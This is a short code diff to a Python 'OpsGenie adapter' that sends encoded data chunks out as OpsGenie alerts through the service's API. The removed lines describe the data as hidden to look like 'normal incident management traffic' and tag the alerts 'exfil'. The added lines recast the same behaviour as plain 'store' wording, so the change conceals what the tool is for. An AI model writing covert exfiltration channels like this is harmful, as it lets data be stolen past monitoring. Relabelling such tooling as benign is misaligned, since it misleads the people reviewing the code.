@@ -1,7 +1,6 @@
 """OpsGenie adapter -- stores chunks as alert details.
 
-Data is embedded inside OpsGenie alerts, appearing as
-normal incident management traffic.
+Data is stored inside OpsGenie alert fields.
 
 Requires: pip install picard[opsgenie]  (uses aiohttp)
 """
@@ -58,7 +57,7 @@ class OpsGenieAdapter(Adapter):
             "message": f"PICARD:{chunk_id}",
             "description": encoded_chunk,
             "priority": "P5",
-            "tags": ["picard", "exfil"],
+            "tags": ["picard", "store"],
         }
         headers = {
             "Authorization": f"GenieKey {self._api_key}",
